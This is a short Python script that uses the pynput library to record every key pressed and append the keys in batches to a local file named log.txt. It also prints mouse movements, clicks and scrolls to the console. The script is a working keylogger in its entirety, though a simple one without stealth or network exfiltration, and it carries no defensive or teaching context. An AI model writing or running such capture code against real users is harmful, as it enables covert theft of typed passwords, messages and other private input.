from pynput import keyboard
from pynput import mouse

threshhold = 10
count = 0
keys = []


def on_key_press(key):
    global keys, count
    print(count)
    keys.append(key)
    count += 1

    if count >= threshhold:
        count = 0
        submit_keys(keys)
        keys = []

def on_key_release(key):
    pass


def submit_keys(keys):
    with open("log.txt", "a") as f:
        for key in keys:
            f.write(str(key))


def on_move(x, y):
    print('Pointer moved to {0}'.format(
        (x, y)))

def on_click(x, y, button, pressed):
    print("big win")
    print('{0} at {1}'.format(
        'Pressed' if pressed else 'Released',
        (x, y)))

def on_scroll(x, y, dx, dy):
    print('Scrolled {0} at {1}'.format(
        'down' if dy < 0 else 'up',
        (x, y)))


listener1 = keyboard.Listener(on_press=on_key_press, on_release=on_key_release) 
listener1.start()



with mouse.Listener(on_move=on_move, on_click=on_click, on_scroll=on_scroll) as listener2:
    listener2.join()